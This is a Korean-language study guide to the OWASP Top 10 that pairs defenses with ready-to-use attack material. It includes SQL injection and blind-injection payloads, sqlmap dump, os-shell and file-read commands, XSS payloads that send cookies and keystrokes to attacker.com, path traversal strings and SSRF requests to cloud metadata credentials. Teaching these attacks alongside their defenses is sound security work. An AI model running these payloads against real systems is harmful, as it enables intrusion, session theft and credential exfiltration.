# OWASP Top 10 — 웹 취약점 완전 정복

## OWASP Top 10 (2021) 개요

| 순위 | 취약점 | 위험도 |
|------|--------|--------|
| A01 | Broken Access Control (접근 제어 실패) | 매우 높음 |
| A02 | Cryptographic Failures (암호화 실패) | 높음 |
| A03 | Injection (인젝션) | 높음 |
| A04 | Insecure Design (안전하지 않은 설계) | 높음 |
| A05 | Security Misconfiguration (보안 설정 오류) | 높음 |
| A06 | Vulnerable Components (취약한 구성 요소) | 중간 |
| A07 | Authentication Failures (인증 실패) | 높음 |
| A08 | Software and Data Integrity Failures | 높음 |
| A09 | Logging Failures (로깅 실패) | 중간 |
| A10 | SSRF (서버측 요청 위조) | 중간 |

---

## A03: SQL Injection (가장 치명적)

### 원리
```
정상 쿼리:
SELECT * FROM users WHERE id='admin' AND pw='password'

공격 (admin' --)
SELECT * FROM users WHERE id='admin' --' AND pw='...'
                                      ↑ 주석으로 뒤를 무효화 → 비밀번호 우회
```

### 기본 SQL Injection 페이로드
```sql
-- 인증 우회
' OR '1'='1
' OR 1=1--
admin'--
' OR 'a'='a

-- 에러 기반 (데이터 추출)
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--

-- UNION 기반 (컬럼 수 확인)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 5--  ← 오류 발생 시 컬럼 수 = 4

-- UNION으로 데이터 추출
' UNION SELECT NULL, NULL, NULL--           (컬럼 수 맞추기)
' UNION SELECT 1, 'text', NULL--
' UNION SELECT 1, table_name, NULL FROM information_schema.tables--
' UNION SELECT 1, column_name, NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1, username, password FROM users--
```

### Blind SQL Injection
```sql
-- Boolean-based (참/거짓으로 데이터 추출)
-- 조건이 참이면 정상 페이지, 거짓이면 다른 결과

' AND 1=1--          ← 정상 (참)
' AND 1=2--          ← 비정상 (거짓)

-- 첫 번째 문자가 'a'인지 확인
' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1))>97--

-- Time-based (응답 시간으로 추출)
' AND SLEEP(5)--            (MySQL)
' WAITFOR DELAY '0:0:5'--   (MSSQL)
'; SELECT pg_sleep(5)--     (PostgreSQL)

-- 조건부 시간 지연
' AND IF(1=1, SLEEP(5), 0)--
' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')=1, SLEEP(5), 0)--
```

### SQLMap 자동화
```bash
# 기본 사용법
sqlmap -u "http://target.com/page.php?id=1"

# POST 파라미터
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# 쿠키 인증
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"

# 데이터베이스 열거
sqlmap -u "http://target.com/?id=1" --dbs          # DB 목록
sqlmap -u "http://target.com/?id=1" -D mydb --tables  # 테이블 목록
sqlmap -u "http://target.com/?id=1" -D mydb -T users --columns  # 컬럼
sqlmap -u "http://target.com/?id=1" -D mydb -T users --dump     # 데이터 추출

# OS 쉘 시도
sqlmap -u "http://target.com/?id=1" --os-shell

# 파일 읽기 (MySQL FILE 권한 필요)
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"

# 속도 및 스텔스 옵션
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3 --delay=1
sqlmap -u "http://target.com/?id=1" --random-agent  # User-Agent 랜덤화
```

### SQL Injection 방어
```php
// PDO Prepared Statement (가장 안전)
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ? AND pw = ?');
$stmt->execute([$id, $pw]);

// MySQLi Prepared Statement
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

// 입력값 검증 (추가 방어)
$id = filter_input(INPUT_GET, 'id', FILTER_SANITIZE_STRING);
$id = intval($id);  // 숫자만 허용
```

---

## A03: XSS (Cross-Site Scripting)

### XSS 종류

#### 1. Reflected XSS (반사형)
```
공격자가 악성 링크를 피해자에게 전달
피해자 클릭 → 서버에서 입력값 그대로 반영 → 브라우저에서 실행

URL: http://target.com/search?q=<script>alert('XSS')</script>

서버 응답:
<div>검색결과: <script>alert('XSS')</script></div>
```

#### 2. Stored XSS (저장형, 더 위험)
```
공격자가 악성 스크립트를 DB에 저장
다른 사용자가 해당 페이지 방문 시 자동 실행

예: 게시판 글쓰기
내용: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

#### 3. DOM-based XSS
```
서버 응답 없이 JavaScript로만 처리되는 XSS
개발자 도구로만 탐지 가능 (서버 로그에 안 남음)

취약 코드:
document.getElementById('output').innerHTML = location.hash.slice(1);

공격: http://target.com/page.html#<img src=x onerror=alert(1)>
```

### XSS 페이로드 모음
```javascript
// 기본 테스트
<script>alert('XSS')</script>

// 필터 우회 (대소문자)
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</ScRiPt>

// 이벤트 핸들러
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<svg onload=alert('XSS')>

// JavaScript 프로토콜
<a href="javascript:alert('XSS')">click</a>

// 스크립트 태그 없는 방법
<iframe src="javascript:alert('XSS')"></iframe>

// 쿠키 탈취
<script>
  document.location='http://attacker.com/steal.php?c='+document.cookie;
</script>

// 키로거
<script>
  document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/log?k=' + e.key;
  };
</script>

// 필터 우회 (인코딩)
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>  // base64
```

### XSS 방어
```php
// PHP에서 출력 시 HTML 엔티티 인코딩
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
echo htmlentities($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript 컨텍스트에 삽입 시
echo json_encode($user_input);
```
```javascript
// JavaScript에서 DOM 조작 시
element.textContent = userInput;    // 안전 (HTML 해석 안 함)
// 위험:
element.innerHTML = userInput;      // XSS 가능!
```
```
// CSP (Content Security Policy) 헤더
Content-Security-Policy: script-src 'self'; object-src 'none';
```

---

## A01: Broken Access Control

### IDOR (Insecure Direct Object Reference)
```
취약 예시:
https://target.com/api/user/1234/profile  ← 내 프로필
https://target.com/api/user/1235/profile  ← 다른 사용자 프로필 (그냥 접근 가능!)

공격:
1. ID 1234 → 1235로 변경 (순차적 열거)
2. UUID로 돼있어도 다른 사용자 UUID 시도

방어:
- 서버에서 세션의 사용자 ID와 요청 자원의 소유자 비교
- 간접 참조 맵 사용 (내부 ID를 외부에 노출하지 않음)
```

### 파일 경로 탐색 (Path Traversal)
```
공격 예시:
https://target.com/file?name=../../../etc/passwd
https://target.com/file?name=....//....//etc/passwd (인코딩 우회)
https://target.com/file?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL 인코딩)

Windows:
https://target.com/file?name=..\..\..\..\windows\system32\drivers\etc\hosts

방어:
$filename = basename($filename);  // 경로 제거
$safe_path = realpath('/uploads/' . $filename);
if (!str_starts_with($safe_path, '/uploads/')) { die('Invalid'); }
```

---

## A07: Authentication Failures

### 세션 하이재킹
```
세션 쿠키 탈취 방법:
1. XSS로 document.cookie 탈취
2. 네트워크 스니핑 (HTTP 평문 전송)
3. 브라우저 히스토리/캐시

방어:
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
- HttpOnly: JavaScript에서 접근 불가 (XSS 방어)
- Secure: HTTPS에서만 전송
- SameSite: CSRF 방어
```

### 비밀번호 재설정 취약점
```
흔한 취약점:
1. 예측 가능한 토큰 (타임스탬프, 순차적 숫자)
2. 토큰 만료 없음
3. 이메일 없이 토큰만으로 재설정 가능
4. 계정 열거 (유효한 이메일이면 다른 응답)

방어:
- 암호학적으로 안전한 랜덤 토큰 (os.urandom(32))
- 짧은 만료 시간 (15분)
- 단일 사용 토큰
```

---

## A05: Security Misconfiguration

### 기본 설정의 위험성
```bash
# 흔한 기본 자격 증명
admin:admin
admin:password
root:root
admin:123456

# 취약한 서버 설정 확인
# Apache 디렉토리 리스팅
curl http://target.com/uploads/  # 파일 목록 노출?

# 에러 메시지에 민감 정보 포함
curl http://target.com/page?id=abc
# → MySQL error: You have an error in your SQL syntax...
#   → DB 타입, 쿼리 구조 노출!

# 디버그 모드 활성화
curl http://target.com/
# → X-Powered-By: PHP/7.4.1
# → Server: Apache/2.4.49
# → 버전 정보로 알려진 취약점 공격 가능
```

### 방화벽/네트워크 설정
```bash
# 불필요한 포트 확인
nmap -sV --script=banner target.com

# 관리 인터페이스 노출 확인
nmap -p 8080,8443,9090,9200,27017 target.com
# 8080: Tomcat 관리자
# 9200: Elasticsearch (인증 없음!)
# 27017: MongoDB (인증 없음!)

# 기본 자격증명으로 관리 패널 접근 시도
curl http://target.com:9200/_cat/indices  # Elasticsearch DB 목록
curl http://target.com:27017/            # MongoDB
```

---

## A10: SSRF (Server Side Request Forgery)

### SSRF 원리
```
서버가 사용자가 제공한 URL에 요청을 보낼 때 발생
→ 내부 네트워크 접근, 클라우드 메타데이터 접근 등

취약 코드 예시:
$url = $_GET['url'];
$content = file_get_contents($url);  // 서버가 임의 URL에 요청!
echo $content;

공격:
1. 내부 서비스 접근
   ?url=http://localhost:8080/admin
   ?url=http://192.168.1.1/admin

2. AWS 메타데이터 접근 (클라우드 환경 핵심!)
   ?url=http://169.254.169.254/latest/meta-data/
   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

3. 포트 스캔
   ?url=http://localhost:22
   ?url=http://internal.server:3306
```

### SSRF 방어
```python
import ipaddress
import urllib.parse

def is_safe_url(url):
    parsed = urllib.parse.urlparse(url)
    hostname = parsed.hostname
    
    try:
        ip = ipaddress.ip_address(hostname)
        # 사설 IP, 루프백, 링크로컬 차단
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except ValueError:
        pass  # IP가 아닌 도메인명
    
    # 화이트리스트 기반
    allowed = ['api.example.com', 'cdn.example.com']
    if hostname not in allowed:
        return False
    
    return True
```

---

## 웹 해킹 실전 도구 정리

### Burp Suite 기본 사용
```
1. Proxy → Intercept 활성화
2. 브라우저 프록시: 127.0.0.1:8080
3. HTTP 트래픽 캡처 및 수정
4. Repeater: 요청 반복 전송 및 분석
5. Intruder: 자동화 공격 (브루트포스, 퍼징)
6. Scanner: 자동 취약점 스캔 (Pro 버전)
```

### Nikto (웹 서버 취약점 스캐너)
```bash
nikto -h http://target.com
nikto -h http://target.com -p 8080
nikto -h http://target.com -ssl  # HTTPS
nikto -h http://target.com -output report.html -Format htm
```

### Gobuster (디렉토리/파일 열거)
```bash
# 디렉토리 열거
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# 파일 확장자 지정
gobuster dir -u http://target.com -w common.txt -x php,html,txt

# 서브도메인 열거
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 가상 호스트 열거
gobuster vhost -u http://target.com -w subdomains.txt
```
